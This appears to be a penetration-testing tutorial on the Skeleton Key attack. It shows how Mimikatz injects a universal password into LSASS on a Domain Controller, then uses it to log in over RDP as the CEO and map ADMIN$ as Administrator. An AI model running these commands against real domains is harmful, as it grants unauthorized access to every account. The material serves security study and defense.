**The Skeleton Key** attack refers to a method used by attackers to gain unauthorized access to systems in an Active Directory environment. It allows an attacker to install a "skeleton key" into the LSASS (Local Security Authority Subsystem Service) memory on a Domain Controller. This skeleton key enables the attacker to log into any account on the domain using a universal password (usually "**mimikatz**"), while the legitimate user can still log in with their actual credentials.


**How Skeleton Key Works:**

   1- Inject Skeleton Key into LSASS:
        The attacker injects a skeleton key into the LSASS process on the Domain Controller using Mimikatz.
        After injecting the skeleton key, the attacker can use a specific password ("mimikatz") to authenticate to any account in the domain.

   2- Accounts Remain Unaffected:
        The legitimate users will continue using their normal passwords without being aware that the attacker has set up a backdoor to access their accounts.

> The skeleton key attack is not persistent. The injected skeleton key is wiped from memory when the Domain Controller is rebooted, meaning it will need to be re-injected after each restart.


**Example of Using Skeleton Key in Mimikatz:**


```
privilege::debug
misc::skeleton
```

After that, you can authenticate as any user by providing the same password, which by default is “**mimikatz**”

**RDP**

RDP can be used to authenticate against the Skeleton Key to access high level accounts from a GUI. Below we can access the CEO's desktop directly.
```
xfreerdp /v:<IP> /u:<User> /p:<mimikatz> /d:<Domain> #Syntax
xfreerdp /v:10.10.10.9 /u:CEO /p:mimikatz /d:security.local
```
**Mapping Remote Shares**

```
net use <DriveLetter:> \\<IP>\<Share> /user:<User> mimikatz #Syntax
net use  \\10.10.10.9\ADMIN$ /user:Administrator mimikatz
```





















